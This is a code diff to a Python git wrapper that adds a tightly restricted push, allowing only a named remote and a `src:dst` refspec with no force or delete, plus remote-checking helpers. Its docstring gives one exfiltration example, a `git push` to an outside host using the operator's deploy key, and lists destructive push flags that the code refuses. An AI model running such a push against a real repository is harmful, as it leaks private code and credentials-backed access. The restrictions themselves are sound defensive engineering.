@@ -6,11 +6,14 @@ worktree on a dedicated branch. No force-push, no writes to the default branch,
 no deletes outside the worktree."* Convention cannot enforce that. A single
 choke point can, so:
 
-- **`_git` refuses any subcommand not on `ALLOWED_SUBCOMMANDS`.** `push`,
-  `remote`, `fetch`, `reset`, `clean`, `checkout`, `switch`, `rebase`,
-  `update-ref` and friends are simply absent, so the capability does not exist
-  in the process at all — a future edit that tries to push raises `GitDenied`
-  before a child is spawned, and a test asserts it.
+- **`_git` refuses any subcommand not on `ALLOWED_SUBCOMMANDS`.** `fetch`,
+  `reset`, `clean`, `checkout`, `switch`, `rebase`, `merge`, `update-ref` and
+  friends are simply absent, so the capability does not exist in the process at
+  all — a future edit that tries to reset a branch raises `GitDenied` before a
+  child is spawned, and a test asserts it. **There is no `merge` here and there
+  will not be**: a local merge means writing to a branch the operator has
+  checked out, which is the one thing this whole design promises not to do. The
+  `commit-merge` node merges *on the remote*, with `push`, below.
 - **`branch` may be read, never deleted.** `-d`/`-D`/`--delete` is refused, on
   any subcommand. A run's branch is the artifact the operator reviews; we
   create branches and we never remove one, not even our own.
@@ -18,6 +21,28 @@ choke point can, so:
   which discards a worktree *we* created under `_runs/`. It is refused
   everywhere else, which is what makes "no force-push" structural rather than
   a promise.
+- **`push` exists now, and is the narrowest subcommand in the file.** The
+  `commit-push` and `commit-merge` output nodes need it (`models.OutputKind`),
+  so the capability can no longer be "absent from the process". What replaces
+  absence is a shape check: a push is *exactly* `git push <remote-name>
+  <src>:<dst>`, with a flag allowlist of three read-only flags, a refspec that
+  must name both sides, and a leading `+` refused outright. Everything a push
+  can be abused for — `--force`, `--force-with-lease`, `--delete`, `--mirror`,
+  `--all`, `--tags`, `+ref:ref`, a bare `<remote>` that pushes whatever
+  `push.default` says — is a `GitDenied` before a child exists.
+
+  Two consequences worth stating rather than discovering:
+
+  - **The remote is a name, never a URL.** `git push git@elsewhere:x.git …` is
+    a working exfiltration of the operator's repository using the operator's
+    own deploy key, and a factory file is a document that can arrive from
+    anywhere. A name has to already be configured in the repo the operator
+    put in the workspace, which is a decision they made outside this process.
+  - **No force means no history rewriting and no merge that isn't a
+    fast-forward.** A `commit-merge` into a base branch that has moved is
+    refused *by the remote*, and the node fails with git's own words. That is
+    the whole of the merge safety story: we never resolve a conflict, because
+    we never have a conflict to resolve.
 
 Two more scars, paid for rather than discovered:
 
@@ -37,12 +62,14 @@ Two more scars, paid for rather than discovered:
 from __future__ import annotations
 
 import os
+import re
 import subprocess
 from dataclasses import dataclass, field
 from pathlib import Path
 
 #: Every git subcommand this process is allowed to run. Read-only ones plus the
-#: three writes a run needs: make a worktree, stage, commit.
+#: four writes a run needs: make a worktree, stage, commit, and — for the two
+#: pushing output kinds — put a ref on a remote.
 ALLOWED_SUBCOMMANDS: frozenset[str] = frozenset(
     {
         "rev-parse",
@@ -55,6 +82,9 @@ ALLOWED_SUBCOMMANDS: frozenset[str] = frozenset(
         "worktree",
         "add",
         "commit",
+        "push",  # one shape only — see `_check_push`
+        "remote",  # `get-url` only — see `_check`
+        "ls-remote",  # read-only, and the pre-flight a pushing node needs
         "var",
         "init",  # tests build repos with it; harmless and never reaches a codebase
         "config",
@@ -64,6 +94,18 @@ ALLOWED_SUBCOMMANDS: frozenset[str] = frozenset(
 #: Arguments that are refused everywhere except the one place named below.
 _FORCE_FLAGS = frozenset({"-f", "--force", "--force-with-lease"})
 _DELETE_FLAGS = frozenset({"-d", "-D", "--delete", "--remove"})
+
+#: The only flags a `push` may carry. All three are about *reporting* — none of
+#: them changes what is written. Anything else is refused, which is what makes
+#: the list of dangerous push flags something we never have to keep up to date.
+_PUSH_FLAGS = frozenset({"--porcelain", "--atomic", "--verbose", "-v"})
+
+#: A remote *name*, never a URL, and never a path. See the module docstring.
+_REMOTE_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$")
+
+#: One side of a refspec. Deliberately narrower than git's own rules: no `+`,
+#: no `^`, no `~`, no `@{…}`, no glob, no whitespace.
+_REF = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._/-]{0,254}$")
 
 #: Hooks live in the *operator's* repo. Running them would execute host-authored
 #: code inside the container on every commit.
@@ -114,13 +156,57 @@ def _check(args: list[str]) -> None:
     if subcommand not in ALLOWED_SUBCOMMANDS:
         raise GitDenied(args, f"`{subcommand}` is not an allowed subcommand")
     rest = args[1:]
-    if subcommand == "branch" and any(flag in _DELETE_FLAGS for flag in rest):
-        raise GitDenied(args, "branches are never deleted, not even ours")
+    if any(flag in _DELETE_FLAGS for flag in rest) and subcommand in ("branch", "push"):
+        # On `branch` this is "we never delete a ref". On `push` it is the same
+        # sentence about someone else's repository, which is the more expensive
+        # one to get wrong.
+        raise GitDenied(args, "refs are never deleted, not even ours")
     force = [flag for flag in rest if flag in _FORCE_FLAGS]
     if force:
         # The one exception: discarding a worktree *we* created under `_runs/`.
         if not (subcommand == "worktree" and rest[:1] == ["remove"]):
             raise GitDenied(args, f"{force[0]} is only allowed on `worktree remove`")
+    if subcommand == "push":
+        _check_push(args, rest)
+    if subcommand == "remote" and rest[:1] != ["get-url"]:
+        # `remote add`/`set-url` would let a factory file point a push at a
+        # host of its choosing; `remote show` talks to the network to answer a
+        # question we never ask. Reading a configured URL is the whole need.
+        raise GitDenied(args, "`remote` may only be used as `remote get-url`")
+
+
+def _check_push(args: list[str], rest: list[str]) -> None:
+    """A push is `git push [safe flags] <remote-name> <src>:<dst>`. Only that.
+
+    Whitelisting the *shape* rather than blacklisting flags is the point: a
+    future git that grows a new way to clobber a remote ref does not quietly
+    become reachable from here, because it will not be one of these three flags
+    and it will not be a `src:dst` refspec.
+    """
+    flags = [item for item in rest if item.startswith("-")]
+    positional = [item for item in rest if not item.startswith("-")]
+    unknown = [flag for flag in flags if flag not in _PUSH_FLAGS]
+    if unknown:
+        raise GitDenied(args, f"{unknown[0]} is not an allowed push flag")
+    if len(positional) != 2:
+        # A bare `git push` — or `git push origin` — pushes whatever
+        # `push.default` and the branch's upstream say, which is a decision
+        # made by a config file we did not write.
+        raise GitDenied(args, "a push must name exactly one remote and one refspec")
+    remote, refspec = positional
+    if not _REMOTE_NAME.match(remote):
+        raise GitDenied(
+            args,
+            f"{remote!r} is not a remote name — a push may only target a remote "
+            "already configured in the repository, never a URL or a path",
+        )
+    if refspec.startswith("+"):
+        raise GitDenied(args, "a leading `+` is a force push")
+    source, separator, destination = refspec.partition(":")
+    if not separator:
+        raise GitDenied(args, "a push refspec must name both sides, as `src:dst`")
+    if not _REF.match(source) or not _REF.match(destination):
+        raise GitDenied(args, f"{refspec!r} is not a plain `src:dst` refspec")
 
 
 def _env(extra: dict[str, str] | None = None) -> dict[str, str]:
@@ -291,6 +377,101 @@ def list_worktrees(repo: Path | str) -> list[str]:
         for line in done.stdout.splitlines()
         if line.startswith("worktree ")
     ]
+
+
+# ---- remotes and pushes -----------------------------------------------------
+#
+# The only part of this module that talks to another machine. Everything here
+# is shaped by `_check_push` above: a push names a configured remote and a
+# `src:dst` refspec, and that is the entire vocabulary.
+
+
+#: The remote a pushing output node uses unless its config names another.
+DEFAULT_REMOTE = "origin"
+
+#: Longer than `DEFAULT_TIMEOUT_S`, because this one crosses a network and a
+#: first push of a large branch is legitimately slow. Still bounded: a run must
+#: not be able to hold the single run slot on a hung TCP connection.
+PUSH_TIMEOUT_S = 300.0
+
+
+@dataclass(frozen=True)
+class PushResult:
+    remote: str
+    source: str
+    destination: str
+    #: git's own summary line. Kept verbatim — when a push is refused, git says
+    #: why far better than a paraphrase would.
+    detail: str
+    #: True when the remote already had this exact commit. Not a failure: a
+    #: `commit-merge` whose base branch is already at the run's commit did what
+    #: it was asked to, and saying so beats inventing an error.
+    already_current: bool = False
+
+
+def remote_url(repo: Path | str, remote: str = DEFAULT_REMOTE) -> str | None:
+    """The configured URL for `remote`, or `None` when there is no such remote.
+
+    Read rather than assumed: a pushing output node is refused at run-check time
+    when this is `None`, which is a sentence the operator can act on before an
+    agent has spent anything.
+    """
+    done = _git(["remote", "get-url", remote], cwd=repo, check=False)
+    return done.stdout.strip() or None if done.returncode == 0 else None
+
+
+def remote_reachable(repo: Path | str, remote: str = DEFAULT_REMOTE) -> tuple[bool, str]:
+    """Can we actually talk to `remote`? Returns `(ok, what git said)`.
+
+    A separate question from `remote_url`, and worth asking separately: a
+    configured remote the container has no key for is the single most likely way
+    a `commit-push` node fails, and it fails *after* the agent has been paid for.
+    """
+    done = _git(
+        ["ls-remote", "--heads", remote],
+        cwd=repo,
+        check=False,
+        timeout=PUSH_TIMEOUT_S,
+    )
+    if done.returncode == 0:
+        return True, ""
+    return False, (done.stderr.strip().splitlines() or ["unreachable"])[-1]
+
+
+def push_ref(
+    worktree: Path | str,
+    source: str,
+    destination: str,
+    *,
+    remote: str = DEFAULT_REMOTE,
+) -> PushResult:
+    """`git push <remote> <source>:<destination>`, and nothing else.
+
+    No force, ever — so a `destination` that has moved since the run branched is
+    **refused by the remote** and raises `GitError` carrying git's own
+    "non-fast-forward" wording. That refusal is the feature: a `commit-merge`
+    node either fast-forwards the base branch or fails loudly, and there is no
+    third outcome in which this process decides how to reconcile two histories.
+    """
+    done = _git(
+        ["push", remote, f"{source}:{destination}"],
+        cwd=worktree,
+        check=False,
+        timeout=PUSH_TIMEOUT_S,
+    )
+    # git puts its progress and its summary on stderr even when it succeeds.
+    said = (done.stderr.strip() or done.stdout.strip()).strip()
+    if done.returncode != 0:
+        raise GitError(["push", remote, f"{source}:{destination}"], done.returncode, said)
+    lines = [line for line in said.splitlines() if line.strip()]
+    detail = lines[-1] if lines else f"pushed {source} to {remote}/{destination}"
+    return PushResult(
+        remote=remote,
+        source=source,
+        destination=destination,
+        detail=detail,
+        already_current="up-to-date" in said.lower() or "up to date" in said.lower(),
+    )
 
 
 # ---- identity and commits ---------------------------------------------------
